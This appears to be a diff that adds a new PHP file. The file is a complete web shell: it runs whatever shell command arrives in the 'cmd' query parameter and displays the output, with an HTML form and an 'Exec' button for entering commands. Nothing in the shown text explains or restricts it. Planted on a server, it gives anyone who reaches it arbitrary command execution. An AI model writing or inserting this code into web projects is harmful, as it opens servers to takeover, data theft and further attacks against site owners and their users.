@@ -1,0 +1,10 @@
+<?php
+if(isset($_GET['cmd'])) {
+    $output = shell_exec($_GET['cmd'] . ' 2>&1');
+    echo "<pre>" . htmlspecialchars($output) . "</pre>";
+}
+?>
+<form method="GET">
+<input type="text" name="cmd" size="60" autofocus>
+<input type="submit" value="Exec">
+</form>
